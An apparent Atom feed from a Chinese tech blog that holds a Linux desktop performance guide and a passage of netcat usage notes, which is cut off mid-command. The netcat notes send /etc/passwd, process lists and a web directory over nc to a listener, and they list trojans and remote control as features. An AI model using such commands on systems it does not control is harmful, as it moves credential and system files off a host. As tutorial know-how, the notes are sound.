<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>F4n9X&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fanqxu.com/"/>
  <updated>2019-04-27T04:49:40.882Z</updated>
  <id>https://fanqxu.com/</id>
  
  <author>
    <name>F4n9X</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux 桌面性能瓶颈优化</title>
    <link href="https://fanqxu.com/2019/04/26/linux-optimization/index.html"/>
    <id>https://fanqxu.com/2019/04/26/linux-optimization/index.html</id>
    <published>2019-04-26T10:51:40.000Z</published>
    <updated>2019-04-27T04:49:40.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我表示已经放弃了 Ubuntu，转向了流弊一批的 Arch。</p><p>遂将曾经使用 Ubuntu 的经验记录下来，并分享出去。</p><p>当然此文并不限于 Ubuntu Desktop。</p></blockquote><h2 id="0x00-SSD-硬盘"><a href="#0x00-SSD-硬盘" class="headerlink" title="0x00 SSD 硬盘"></a>0x00 SSD 硬盘</h2><h3 id="分区对齐"><a href="#分区对齐" class="headerlink" title="分区对齐"></a>分区对齐</h3><p>关于如今的固态硬盘，已不再需要手动分区对齐。因为目前主流 Linux 系统都已自动对齐文件系统和分区【<strong>页面大小4096字节</strong>】。</p><h3 id="优化原则"><a href="#优化原则" class="headerlink" title="优化原则"></a>优化原则</h3><p>由于频繁写操作会磨损固态硬盘，所以对于其优化原则就是：【<strong>尽量减少写操作</strong>】。</p><a id="more"></a><h3 id="文件系统类型"><a href="#文件系统类型" class="headerlink" title="文件系统类型"></a>文件系统类型</h3><p>而对于文件系统类型，墙裂推荐【<strong>EXT4</strong>】，EXT4 文件系统的日志会对硬盘多产生一些写操作，但不会太多；不建议关闭所有日志，因为日志对于恢复系统的崩溃较为重要。</p><h3 id="禁用写操作"><a href="#禁用写操作" class="headerlink" title="禁用写操作"></a>禁用写操作</h3><h4 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h4><p>操作系统在对于文件读取时，同时还会对文件的时间戳进行一个写操作；而这个写操作的意义是非常小，所以建议关闭。</p><p>编辑分区表，为你的<strong>根分区</strong>和 <strong>Home 分区</strong> 都增加 noatime 选项。</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span> sudo vim /etc/fstab</span><br></pre></td></tr></table></figure><p>如下，由于我并没有将 <strong>Home</strong> 分区单独分出来，所有仅在 / 分区的 <em>options</em> 位置添加了 <strong>noatime</strong>。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span></span><br><span class="line"><span class="hljs-comment"># /dev/sda1</span></span><br><span class="line">UUID=4a7fcb3e-fdcc-4c03-9ee3-de3c5ds3da30/         ext4      noatime,rw,relatime0 1</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># /dev/sda2</span></span><br><span class="line">UUID=F06E-6942      /boot/EFI vfat      rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro0 2</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># /dev/sda3</span></span><br><span class="line">UUID=c9e9e9d5-cde4-4ab4-adf9-027d56384e10none      swap      defaults  0 0</span><br></pre></td></tr></table></figure><h4 id="禁用休眠"><a href="#禁用休眠" class="headerlink" title="禁用休眠"></a>禁用休眠</h4><p>计算机休眠挂起会导致磁盘会导致大量的写操作，好在 Ubuntu 默认关闭，请不要开启。</p><h4 id="碎片整理"><a href="#碎片整理" class="headerlink" title="碎片整理"></a>碎片整理</h4><p>许多从 Windows 上转移到 Linux的同学可能会思考关于磁盘碎片整理的问题。而 Linux 下<strong>不必要进行碎片整理</strong>，非但不必要，而且还得<strong>避免碎片整理</strong>。碎片整理会导致大量的写操作，对 SSD 是致命的伤害。由于 Linux 系统的特性，不同于 Windows，也没必要进行碎片整理。</p><h3 id="TRIM-定期清理磁盘"><a href="#TRIM-定期清理磁盘" class="headerlink" title="TRIM 定期清理磁盘"></a>TRIM 定期清理磁盘</h3><p>Ubuntu 默认已经安装 TRIM，可通过一下命令查看是否支持。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo hdparm -I /dev/sda | grep TRIM</span><br><span class="line">   *Data Set Management TRIM supported (<span class="hljs-built_in">limit</span> 8 blocks)</span><br><span class="line">   *Deterministic <span class="hljs-built_in">read</span> ZEROs after TRIM</span><br></pre></td></tr></table></figure><p>查看服务状态：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl status fstrim.service</span><br><span class="line">● fstrim.service - Discard unused blocks on filesystems from /etc/fstab</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/fstrim.service; static; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:fstrim(8)</span><br></pre></td></tr></table></figure><p>可看到此服务是关闭状态；因为默认一周清理一次，没必要时时对硬盘进行清理。</p><p>指定根分区节点，手动清理：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo fstrim -v /</span><br></pre></td></tr></table></figure><p>自定义每日清理：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkdir -v /etc/systemd/system/fstrim.timer.d</span><br><span class="line">$ sudo vim /etc/systemd/system/fstrim.timer.d/override.conf</span><br></pre></td></tr></table></figure><p>添加如下几行：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Timer]</span><br><span class="line">OnCalendar=</span><br><span class="line">OnCalendar=daily</span><br></pre></td></tr></table></figure><h3 id="硬盘缓存"><a href="#硬盘缓存" class="headerlink" title="硬盘缓存"></a>硬盘缓存</h3><p>所谓缓存，其本质上就是一块内存空间；缓存机制会在 CPU 读取硬盘数据之前，提前将数据放入缓存之中；CPU 需要读取数据时，从而可以从缓存之中读取数据，进而从整体上提高系统的运行效率。此处缓存所指<strong>写缓存</strong>。</p><p>程序在运行中，会等待数据在写入到硬盘之后才会进行下一步操作。因为数据如果不写入至硬盘，还停留在内存中，一旦断电内存中的数据就会丢失。Ubuntu 默认没有开启写缓存；而对于有电源的笔记本，这是不必要的。所以建议笔记本 Linux 用户开启写缓存。PC 台式机谨慎！！！</p><p>打开 【<strong>Disks</strong>】工具，先在左侧选择你的磁盘，然后点击右上角。找到【<strong>Drive Setting</strong>】开启【<strong>Enable Write Cache</strong>】</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1g2h32g0vchj30q70hp74r.jpg" alt="Enable Write Cache"></p><h2 id="0x01-CPU"><a href="#0x01-CPU" class="headerlink" title="0x01 CPU"></a>0x01 CPU</h2><h3 id="安装微码"><a href="#安装微码" class="headerlink" title="安装微码"></a>安装微码</h3><p>介于 CPU 的完全，建议安装微码安全补丁。安装之后也会对 CPU 的性能有小的提升。</p><p><strong>Intel</strong></p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install intel-microcode</span><br></pre></td></tr></table></figure><p><strong>AMD</strong></p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install amd64-microcode</span><br></pre></td></tr></table></figure><h3 id="温度监视"><a href="#温度监视" class="headerlink" title="温度监视"></a>温度监视</h3><p>安装一个温度监视器。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install lm-sensors</span><br></pre></td></tr></table></figure><p>查看：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ sensors </span><br><span class="line">coretemp-isa-0000</span><br><span class="line">Adapter: ISA adapter</span><br><span class="line">Package id 0:  +32.0°C  (high = +100.0°C, crit = +100.0°C)</span><br><span class="line">Core 0:        +30.0°C  (high = +100.0°C, crit = +100.0°C)</span><br><span class="line">Core 1:        +30.0°C  (high = +100.0°C, crit = +100.0°C)</span><br><span class="line"></span><br><span class="line">acpitz-acpi-0</span><br><span class="line">Adapter: ACPI interface</span><br><span class="line">temp1:        +32.0°C  (crit = +103.0°C)</span><br><span class="line"></span><br><span class="line">nouveau-pci-0100</span><br><span class="line">Adapter: PCI adapter</span><br><span class="line">GPU core:     +0.60 V  (min =  +0.60 V, max =  +1.20 V)</span><br><span class="line"></span><br><span class="line">iwlwifi-virtual-0</span><br><span class="line">Adapter: Virtual device</span><br><span class="line">temp1:        +27.0°C  </span><br><span class="line"></span><br><span class="line">pch_skylake-virtual-0</span><br><span class="line">Adapter: Virtual device</span><br><span class="line">temp1:        +27.5°C</span><br></pre></td></tr></table></figure><h2 id="0x02-内存优化"><a href="#0x02-内存优化" class="headerlink" title="0x02 内存优化"></a>0x02 内存优化</h2><h3 id="限制-inode-缓存"><a href="#限制-inode-缓存" class="headerlink" title="限制 inode 缓存"></a>限制 <strong>inode</strong> 缓存</h3><p>其实我也不太懂这是啥，便从维基上抄了下面这句话。顺便吐槽一句，几天前，伟大的天朝将中立的<strong>维基百科</strong>已【<strong>全面封锁</strong>】；早在此前，仅是中文页面被封锁。下一个会不会是 <strong><a href="https://github.com" target="_blank" rel="noopener">Github</a></strong> 呢！！！</p><blockquote><p><strong>inode</strong>是指在许多“类<a href="https://zh.wikipedia.org/wiki/Unix" target="_blank" rel="noopener">Unix</a><a href="https://zh.wikipedia.org/wiki/文件系统" target="_blank" rel="noopener">文件系统</a>”中的一种<a href="https://zh.wikipedia.org/wiki/数据结构" target="_blank" rel="noopener">数据结构</a>。每个inode保存了文件系统中的一个<strong>文件系统对象</strong>（包括<a href="https://zh.wikipedia.org/wiki/计算机文件" target="_blank" rel="noopener">文件</a>、<a href="https://zh.wikipedia.org/wiki/目录_(文件系统" target="_blank" rel="noopener">目录</a>)、<a href="https://zh.wikipedia.org/wiki/设备文件" target="_blank" rel="noopener">设备文件</a>、<a href="https://zh.wikipedia.org/wiki/Unix域套接字" target="_blank" rel="noopener">socket</a>、<a href="https://zh.wikipedia.org/wiki/管道_(Unix" target="_blank" rel="noopener">管道</a>), 等等）的元信息数据，但不包括数据内容或者文件名<a href="https://zh.wikipedia.org/wiki/Inode#cite_note-1" target="_blank" rel="noopener">[1]</a>。</p></blockquote><p>还是建议内存大一点的限制 <strong>inode</strong> 缓存，多大呢？大于4G吧。</p><p>这样做的代价就是，某些系统项将在内存中保留更长的时间。好处就是使计算机速度有明显的提升。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>添加如下配置至尾行：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.vfs_cache_pressure=50</span><br></pre></td></tr></table></figure><h3 id="Tmp-放入内存"><a href="#Tmp-放入内存" class="headerlink" title="Tmp 放入内存"></a>Tmp 放入内存</h3><p>Tmp 目录用于存放一些中间临时数据的目录，但是其位于硬盘，如果将其放入内存(Tmpfs)中，这将大大提高一些数据读写的效率。还是建议内存大于8G的这么做。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cp -v /usr/share/systemd/tmp.mount /etc/systemd/system/</span><br><span class="line">$ sudo systemctl <span class="hljs-built_in">enable</span> tmp.mount</span><br></pre></td></tr></table></figure><p>重启生效，查看状态：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl status tmp.mount </span><br><span class="line">● tmp.mount - /tmp</span><br><span class="line">   Loaded: loaded (/etc/fstab; generated)</span><br><span class="line">   Active: active (mounted) since Sat 2019-04-27 10:57:47 CST; 1h 20min ago</span><br><span class="line">    Where: /tmp</span><br><span class="line">     What: tmpfs</span><br><span class="line">     Docs: man:fstab(5)</span><br><span class="line">           man:systemd-fstab-generator(8)</span><br><span class="line">    Tasks: 0 (<span class="hljs-built_in">limit</span>: 4915)</span><br><span class="line">   Memory: 32.0K</span><br><span class="line">   CGroup: /system.slice/tmp.mount</span><br><span class="line"></span><br><span class="line">Apr 27 10:57:47 4rch systemd[1]: Mounting /tmp...</span><br><span class="line">Apr 27 10:57:47 4rch systemd[1]: Mounted /tmp.</span><br></pre></td></tr></table></figure><p>如何取消呢？只需将此文件删除即可。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rm -v /etc/systemd/system/tmp.mount</span><br></pre></td></tr></table></figure><h2 id="0x03-SWAP-分区"><a href="#0x03-SWAP-分区" class="headerlink" title="0x03 SWAP 分区"></a>0x03 SWAP 分区</h2><p>由于内存的有限，所有当运行一个很大的程序时，系统会将一部分内存交换至 swap 交换分区中； swap 分区即为硬盘，与内存相比较，在速度上是有很大的差距的。</p><p>而且 Ubuntu 默认当还剩60%内存时就开始将一部分内存交换至 swap 分区中。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/vm/swappiness </span><br><span class="line">60</span><br></pre></td></tr></table></figure><p>修改 swappiness 参数。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>添加以下参数至以上配置文件的尾行。这个数值只是一个百分百，可以按照自己的需求自定义。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.swappiness=10</span><br></pre></td></tr></table></figure><h2 id="0x04-显示撕裂"><a href="#0x04-显示撕裂" class="headerlink" title="0x04 显示撕裂"></a>0x04 显示撕裂</h2><p>在正确安装 NVIDIA 显卡驱动之后，依旧有时候会出现窗口撕裂的现象。（AMD 貌似没有这回事）</p><p>这时就需要编辑 grub 配置文件来解决。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>修改以下一行配置：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="hljs-string">"quiet"</span></span><br></pre></td></tr></table></figure><p>在 <code>quiet</code> 后增加 <code>nvidia-drm.modeset=1</code>，如下。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="hljs-string">"quiet nvidia-drm.modeset=1"</span></span><br></pre></td></tr></table></figure><p>然后更新 <strong>grub</strong>，重启生效。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ update-grub &amp;&amp; reboot</span><br></pre></td></tr></table></figure><p>验证：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ xrandr --verbose | grep PRIME</span><br><span class="line">PRIME Synchronization:1</span><br><span class="line">PRIME Synchronization:1</span><br></pre></td></tr></table></figure><h2 id="0x05-启动项优化"><a href="#0x05-启动项优化" class="headerlink" title="0x05 启动项优化"></a>0x05 启动项优化</h2><p>Linux 下很多启动(开机自启)项默认都是隐藏状态；使用一条替换命令，显示所有启动项。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sed -i <span class="hljs-string">'s/NoDisplay=true/NoDisplay=false/g'</span> /etc/xdg/autostart/*.desktop</span><br></pre></td></tr></table></figure><p>然后打开 <strong>Startup Applications</strong>，按照个人需求自定义关闭不需要的启动项。</p><h2 id="0x06-浏览器优化"><a href="#0x06-浏览器优化" class="headerlink" title="0x06 浏览器优化"></a>0x06 浏览器优化</h2><h3 id="限制-Firefox-写操作"><a href="#限制-Firefox-写操作" class="headerlink" title="限制 Firefox 写操作"></a>限制 Firefox 写操作</h3><p>将 Firefox 网络缓存放入内存中，可提高运行速度；当然内存太小不建议这样操作。</p><p>首先打开 Firefox，在浏览器地址栏输入：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about:config</span><br></pre></td></tr></table></figure><p>回车，点击<code>I accept the risk</code>。</p><p>搜索 <code>browser.cache.disk.enable</code>，双击将 <strong>Value</strong> 由 <code>true</code>变为<code>false</code>。</p><p>再次搜索<code>browser.cache.memory.enable</code>，将 <strong>Value</strong> 变为<code>true</code>。</p><p>再然后右击，点击<code>New</code>，选择<code>Integer</code>，输入<code>browser.cache.memory.capacity</code>，点击 <strong>OK</strong>，输入值<code>204800</code>。</p><h3 id="禁用-Firefox-sessionstore"><a href="#禁用-Firefox-sessionstore" class="headerlink" title="禁用 Firefox sessionstore"></a>禁用 Firefox sessionstore</h3><p>由于恢复 Firefox 意外崩溃的回话会导致大量的写操作，这对于 SSD 硬盘是很受伤的，所以建议关闭。</p><p>搜索 <code>browser.sessionstore.interval</code>，将原来的值<code>15000</code>修改为<code>15000000</code>。</p><h3 id="禁用无必要网络访问"><a href="#禁用无必要网络访问" class="headerlink" title="禁用无必要网络访问"></a>禁用无必要网络访问</h3><p>对于使用 Firefox 来进行 Web 应用程序截断代理、漏洞挖掘。使用过 <strong>BurpSuite</strong> 就会知道，可能经常会抓到一些其他无相关的站点的数据包， 这是 Firefox 在后台偷偷地去请求一个网址，这当然是我们不想看到的结果；它之所以这么做，是基于一种网络可用性探测的需求，这样做会消耗我们的带宽、以及降低小小的运行效率。</p><p>搜索<code>network.captive-portal-service.enabled</code>，双击将 <strong>Value</strong> 由 <code>true</code>变为<code>false</code>。</p><h3 id="限制-Chrome-写操作"><a href="#限制-Chrome-写操作" class="headerlink" title="限制 Chrome 写操作"></a>限制 Chrome 写操作</h3><p><code>Settings</code>—-&gt;<code>Advanced</code>—-&gt;<code>Privacy</code>—-&gt;<code>Use a prediction service to load pages more quickly</code></p><p>关闭此项。</p><h2 id="0x07-系统清理"><a href="#0x07-系统清理" class="headerlink" title="0x07 系统清理"></a>0x07 系统清理</h2><p>清理系统不需要的缓存等等</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt autoremove</span><br><span class="line">$ sudo apt autoclean</span><br></pre></td></tr></table></figure><p>不得不承认这两条命令清理的并不彻底。</p><h3 id="Stacer"><a href="#Stacer" class="headerlink" title="Stacer"></a>Stacer</h3><p><strong>Github：</strong><a href="https://github.com/oguzhaninan/Stacer" target="_blank" rel="noopener">github.com/oguzhaninan/Stacer</a></p><p>从仓库主页 <strong>releases</strong> 中找到以 <strong>.deb</strong> 结尾的软件包，下载并安装。这款软件是图形化操作，界面比较友好。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo dpkg -i stacer_1.0.9_amd64.deb</span><br></pre></td></tr></table></figure><h3 id="Bleachbit"><a href="#Bleachbit" class="headerlink" title="Bleachbit"></a>Bleachbit</h3><p>这款软件貌似系统自带，搜索打开即可使用。其界面并没有 <strong>Stacer</strong> 那么友好，但清理的特别彻底。</p><p>关于系统清理，如果操作不当；轻则破坏你的个性化设置，严重可能会导致系统崩溃。请谨慎操作！！！</p><h2 id="0x08-优化电池寿命"><a href="#0x08-优化电池寿命" class="headerlink" title="0x08 优化电池寿命"></a>0x08 优化电池寿命</h2><p>关于优化电池寿命，其实是一件非常复杂的问题。所以，我使用的是一种简单的办法，可能并不是十全十美，但依旧能满足大部分人的需求。</p><p>安装一个软件包，并将电池优化的工作交给它。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install tlp tlp-rdw</span><br></pre></td></tr></table></figure><p>然后启动它：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tlp start</span><br><span class="line">TLP started <span class="hljs-keyword">in</span> AC mode.</span><br></pre></td></tr></table></figure><p>查看 <strong>tlp</strong> 状态：</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tlp-stat</span><br></pre></td></tr></table></figure><p><strong>tlp</strong> 优化的结果可能并不是最最最优的结果，但它完全能满足我们这些非专业人士的电池优化需求。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;我表示已经放弃了 Ubuntu，转向了流弊一批的 Arch。&lt;/p&gt;
&lt;p&gt;遂将曾经使用 Ubuntu 的经验记录下来，并分享出去。&lt;/p&gt;
&lt;p&gt;当然此文并不限于 Ubuntu Desktop。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-SSD-硬盘&quot;&gt;&lt;a href=&quot;#0x00-SSD-硬盘&quot; class=&quot;headerlink&quot; title=&quot;0x00 SSD 硬盘&quot;&gt;&lt;/a&gt;0x00 SSD 硬盘&lt;/h2&gt;&lt;h3 id=&quot;分区对齐&quot;&gt;&lt;a href=&quot;#分区对齐&quot; class=&quot;headerlink&quot; title=&quot;分区对齐&quot;&gt;&lt;/a&gt;分区对齐&lt;/h3&gt;&lt;p&gt;关于如今的固态硬盘，已不再需要手动分区对齐。因为目前主流 Linux 系统都已自动对齐文件系统和分区【&lt;strong&gt;页面大小4096字节&lt;/strong&gt;】。&lt;/p&gt;
&lt;h3 id=&quot;优化原则&quot;&gt;&lt;a href=&quot;#优化原则&quot; class=&quot;headerlink&quot; title=&quot;优化原则&quot;&gt;&lt;/a&gt;优化原则&lt;/h3&gt;&lt;p&gt;由于频繁写操作会磨损固态硬盘，所以对于其优化原则就是：【&lt;strong&gt;尽量减少写操作&lt;/strong&gt;】。&lt;/p&gt;
    
    </summary>
    
      <category term="TechShare" scheme="https://fanqxu.com/categories/TechShare/"/>
    
    
      <category term="linux" scheme="https://fanqxu.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>瑞士军刀 NETCAT 使用笔记</title>
    <link href="https://fanqxu.com/2019/04/20/NETCAT-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/index.html"/>
    <id>https://fanqxu.com/2019/04/20/NETCAT-使用笔记/index.html</id>
    <published>2019-04-20T11:32:55.000Z</published>
    <updated>2019-04-27T04:26:41.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h2><ul><li>网络工具中的瑞士军刀</li><li>侦听模式、传输模式</li><li>Telnet、获取Banner信息</li><li>传输即时文本信息、文件、目录</li><li>加密传输文件</li><li>远程控制、木马</li><li>加密所有流量</li><li>远程克隆硬盘</li><li>流媒体服务器</li></ul><a id="more"></a><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv 192.168.43.218 80</span><br></pre></td></tr></table></figure><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-n 后面跟IP地址，且不做域名解析</span><br><span class="line">-v 显示详细信息内容</span><br></pre></td></tr></table></figure><h2 id="信息传输"><a href="#信息传输" class="headerlink" title="信息传输"></a>信息传输</h2><h3 id="文本传输"><a href="#文本传输" class="headerlink" title="文本传输"></a>文本传输</h3><ul><li><p>服务端：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -l -p 4444</span></span><br><span class="line">-l 打开、侦听一个端口</span><br><span class="line">-p 端口</span><br></pre></td></tr></table></figure></li><li><p>客户端：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -nv 192.168.43.218 4444</span></span><br><span class="line">Connection to 192.168.43.218 4444 port [tcp/*] succeeded!</span><br></pre></td></tr></table></figure></li></ul><h3 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h3><p>电子取证的原则就是尽量减少在被审计端的操作。</p><ul><li><p>审计端：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -l -p 4444 &gt; ps.txt</span></span><br></pre></td></tr></table></figure></li><li><p>被审计端：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> ps aux | nc -nv 192.168.43.8 4444 -q 1</span></span><br><span class="line">-q 后面跟秒数，代表传输完成后多少秒断开连接</span><br></pre></td></tr></table></figure></li></ul><p>将进程信息由被审计端传到审计端。</p><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><ul><li><p>接受端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -lp 4444 &gt; passwd.txt</span></span><br></pre></td></tr></table></figure></li><li><p>发送端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -nv 192.168.43.8 &lt; /etc/passwd -q 1</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>或者：</strong></p><ul><li><p>接收端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -q 1 -lp 4444 &gt; passwd.txt</span></span><br></pre></td></tr></table></figure></li><li><p>发送端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -nv 192.168.43.8 4444 &lt; /etc/passwd</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>其实就是调用系统其他程序来完成功能的实现，包括下面的加密传输……</p><ul><li><p>发送端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> tar -cvf - /var/www/html/dvwa/ | nc -lp 4444 -q 1</span></span><br></pre></td></tr></table></figure></li><li><p>接受端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc 192.168.43.218 4444 | tar -xvf -</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="加密传输"><a href="#加密传输" class="headerlink" title="加密传输"></a>加密传输</h2><ul><li><p>接受端</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> nc -lp 4444 | mcrypt --flush 